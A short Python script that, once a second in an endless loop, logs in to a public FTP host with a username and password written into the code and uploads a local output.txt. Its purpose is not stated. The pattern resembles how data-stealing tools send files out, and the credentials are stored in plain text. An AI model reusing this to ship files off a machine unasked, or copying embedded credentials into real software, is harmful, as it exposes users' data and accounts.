import time
import ftplib
while True:
	time.sleep(1)
	session = ftplib.FTP('ftp.geocities.ws','sefgfaulted','wepartyrock')
	session.cwd("fah")
	file=open('output.txt','rb')
	session.storbinary('STOR output.txt', file)     
	file.close()
	session.quit()